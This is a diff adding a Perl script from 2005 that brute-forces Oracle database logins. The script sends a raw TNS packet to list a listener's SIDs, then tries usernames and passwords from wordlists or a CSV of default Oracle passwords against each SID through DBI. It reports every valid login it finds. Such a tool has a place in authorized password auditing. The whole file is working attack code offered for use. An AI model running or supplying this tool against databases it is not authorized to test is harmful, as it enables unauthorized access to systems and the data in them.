@@ -1,0 +1,203 @@
+#!/usr/bin/perl
+# Fri Feb  4 18:41:54 CET 2005 <dab@digitalsec.net>
+# Brute force for Oracle databases.
+# !dSR - www.digitalsec.net
+
+use DBI;
+use IO::Socket;
+use strict;
+use Getopt::Long;
+Getopt::Long::config qw(no_ignore_case);
+
+$|=1;
+
+my $total = 0;
+my ($host,$user,$passwd,$debug,$tout,$list,$ufile,$pfile);
+my (@SIDS,@sidz,%seen);
+my $stime = time();
+
+my $opts = GetOptions( 'host:s' => \$host, 'user:s' => \$user, 
+                       'passwd:s' => \$passwd, 'debug:i' => \$debug, 
+                       'tout:i' => \$tout, 'list:s' => \$list,
+   'Ufile:s' => \$ufile, 'Pfile:s' => \$pfile);
+
+my ($ip,$port) = split(/:/,$host);
+
+# Default options
+$port = "1521" if ! $port;
+$tout = "10" if ! $tout;
+
+# Help if bad argument (TODO: change this)
+&help unless $opts;
+if (!$host) { &help }
+if ((!$user && !$ufile) && !$list) { &help }
+if ((!$passwd && !$pfile) && (!$list)) { &help }
+if ($ufile && $user)  { &help }
+if ($pfile && $passwd) { &help }
+if (($ufile || $user) && $list ) { &help }
+if (($pfile || $passwd) && $list ) { &help }
+
+
+# Packet to get SIDs
+my (@packet) = (
+    0x00, 0x5b, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 
+    0x01, 0x36, 0x01, 0x2c, 0x00, 0x00, 0x08, 0x00,
+    0x7f, 0xff, 0x7f, 0x08, 0x00, 0x00, 0x00, 0x01,
+    0x00, 0x21, 0x00, 0x3a, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x34, 0xe6, 0x00, 0x00,
+    0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x28, 0x43, 0x4F, 0x4E, 0x4E, 0x45,
+    0x43, 0x54, 0x5F, 0x44, 0x41, 0x54, 0x41, 0x3D,
+    0x28, 0x43, 0x4F, 0x4D, 0x4D, 0x41, 0x4E, 0x44,
+    0x3D, 0x73, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65,
+    0x73, 0x29, 0x29
+    );
+
+print "!dSR - Oracle bruteforce by <dab\@digitalsec.net>\n";
+print "Trying to connect: $ip:$port ($tout secs)\n";
+
+my ($sendbuf) = pack("C*", @packet);
+my ($socket) = IO::Socket::INET->new( 
+PeerAddr => $ip,
+PeerPort => $port, 
+Proto => 'tcp', 
+Type => SOCK_STREAM, 
+Timeout => $tout) || die "Can't connect to: $ip:$port - $!\n";
+$socket->autoflush(1);
+
+ print $socket "$sendbuf";
+ while(<$socket>){ 
+print "$_\n" if $debug;
+push(@sidz,"$1") while /INSTANCE_NAME=(.*?)\)/g;
+ };
+ close($socket);
+
+#get uniq SIDs
+@SIDS = grep { ! $seen{$_} ++ } @sidz;
+
+print "Working...\n";
+foreach my $sid (@SIDS) {
+  print "SID: $sid\n" if $debug;
+  if ($sid eq "PLSExtProc") { print "Skipping $sid\n" if $debug;  next; }
+
+  # brbrbrb!
+  if ($ufile) {
+   open U, "$ufile" or die "Can't open user file $ufile : $!";
+   while (<U>) {
+    chomp($_);
+    $user = $_;
+    if ($pfile) 
+   {
+   open P, "$pfile" or die "Can't open passwd file: $pfile : $!";
+   while (<P>) 
+  { 
+chomp($_);
+$passwd = $_;
+my $ec = &orabf($ip,$sid,$port,$user,$passwd);
+if ($ec == 0) { 
+print "WOOP: $sid\@$user/$passwd - $ip:$port\n";
+    $total++;
+} else {
+print "NO DONUT: $user/$passwd - $ip:$port\n" if $debug;
+}
+  }
+    close (P);
+    } else 
+{
+        my $ec = &orabf($ip,$sid,$port,$user,$passwd);
+              if ($ec == 0) { 
+                  print "WOOP: $sid\@$user/$passwd - $ip:$port\n";
+                  $total++;
+              } else {
+                  print "NO DONUT: $user/$passwd - $ip:$port\n" if $debug;
+              }
+
+}
+
+    }
+     close (U);
+   } else {
+    if ($pfile) 
+   {
+   open P, "$pfile" or die "Can't open passwd file: $pfile : $!";
+   while (<P>) 
+  { 
+chomp($_);
+$passwd = $_;
+my $ec = &orabf($ip,$sid,$port,$user,$passwd);
+                    if ($ec == 0) { 
+                        print "WOOP: $sid\@$user/$passwd - $ip:$port\n";
+                        $total++;
+                    } else {
+                        print "NO DONUT: $user/$passwd - $ip:$port\n" if $debug;
+                    }
+
+  }
+    close (P);
+    } else 
+{
+        my $ec = &orabf($ip,$sid,$port,$user,$passwd);
+              if ($ec == 0) { 
+                  print "WOOP: $sid\@$user/$passwd - $ip:$port\n";
+                  $total++;
+              } else {
+                  print "NO DONUT: $user/$passwd - $ip:$port\n" if $debug;
+              }
+
+}
+
+  }
+
+
+  if ($list) {
+   open CSV, "$list" or die "Can't open csv file $list : $!";
+   while (<CSV>) {
+     my($a,$b,$user,$passwd)=split /,/,$_;
+     my $ec = &orabf($ip,$sid,$port,$user,$passwd);
+     if ($ec == 0) { 
+        print "WOOP: $sid\@$user/$passwd - $ip:$port\n";
+        $total++;
+     } else {
+        print "NO DONUT: $user/$passwd - $ip:$port\n" if $debug;
+     }
+
+   }  
+   close (CSV);  
+  }
+
+}
+
+
+# stats
+my $ftime = time();
+my $time = $ftime - $stime;
+print "Finished: ($total) users found. ($time secs)\n";
+
+# EOF
+
+# Returns 0 if is valid passwd and 1 if isn't
+sub orabf {
+  my $ec = 0;
+  my ($ip,$sid,$port,$user,$passwd)=@_;
+  my $dbh = DBI->connect("dbi:Oracle:host=$ip;sid=$sid;port=$port", "$user", "$passwd", { RaiseError => 0, PrintError => 0}) or $ec = "1";
+  return $ec;
+}
+
+# help, heh
+sub help {
+  print "!dSR - Oracle bruteforce by <dab\@digitalsec.net>\n";
+  print "usage: $0 -h <host[:port]> <[-u <user> | -U <file>] [-p <passwd> | -P <file>] [-l <file>]> [-t <n>] [-d <1|0>]\n";
+  print "options:\n";
+  print "  -h, --host <host[:port]>\thost and optional port (default: 1521)\n";
+  print "  -u, --user <user>\t\tusername\n";
+  print "  -U, --Ufile <file>\t\tfile with users list\n";
+  print "  -p, --passwd <passwd>\t\tpassword\n";
+  print "  -P, --Pfile <file>\t\tfile with passwords list\n";
+  print "  -l, --list <file>\t\tCSV* file with user/passwd list\n";
+  print "  -t, --tout <n>\t\tconnection timeout (default: 10)\n";
+  print "  -d, --debug <1|0>\t\tenable debug (default: 0)\n";
+  print "(*)last CSV file at:www.petefinnigan.com/default/oracle_default_passwords.csv\n";
+  exit 0
+}
+
